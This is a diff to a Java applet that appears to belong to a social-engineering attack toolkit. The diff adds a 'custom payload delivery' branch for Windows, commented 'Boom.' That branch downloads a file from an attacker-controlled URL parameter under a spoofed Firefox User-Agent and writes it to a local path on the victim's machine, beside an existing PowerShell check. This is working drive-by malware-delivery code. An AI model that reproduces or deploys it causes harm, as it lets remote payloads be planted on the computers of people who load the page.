@@ -88,8 +88,9 @@ public class Java extends Applet {
 
 	   if ( osType < 1 )
 	   {
-	   // here we check for powershel
+	   // here we check for powershell
            File file = new File("c:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe");
+	   if (sixthParm.length() < 4) {
   	   if (!file.exists()) {
  	        // URL parameter
         	URL url = new URL(downParm);
@@ -125,8 +126,56 @@ public class Java extends Applet {
         	out.flush();
                 out.close();
                 }
-//		}
 		}
+		}
+
+		if ( osType < 1 )
+		{
+		// This is if we are using a custom payload delivery
+		// CUSTOM PAYLOAD FOR WINDOWS HERE
+		// Boom.
+
+		// if sixth parameter is greater than yes, which is CUST, four characters then trigger on custom payload for download
+		if (sixthParm.length() > 3) {
+                // URL parameter
+                URL url = new URL(downParm);
+                // Open the conneciton
+                URLConnection hc = url.openConnection();
+                // set the user agent string
+                hc.setRequestProperty("User-Agent", "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2");
+                // grab content type
+                String contentType = hc.getContentType();
+                // grab content length
+                int contentLength = hc.getContentLength();
+                // pull input stream
+                InputStream raw = hc.getInputStream();
+                // stream buffer into raw input stream
+                InputStream in = new BufferedInputStream(raw);
+                // write the bytes out
+                byte[] data = new byte[contentLength];
+                int bytesRead = 0;
+                int offset = 0;
+                while (offset < contentLength) {
+                        bytesRead = in.read(data, offset, data.length - offset);
+                        if (bytesRead == -1)
+                        break;
+                        offset += bytesRead;
+                            }
+                // close it
+                in.close();
+                // write file out to pfad
+                String filename = url.getFile();
+                FileOutputStream out = new FileOutputStream(pfad);
+                // close everything out
+                out.write(data);
+                out.flush();
+                out.close();
+                }
+                //}
+
+                }
+
+
 
     	         // download file all other OS
 		if ( osType > 1 ){
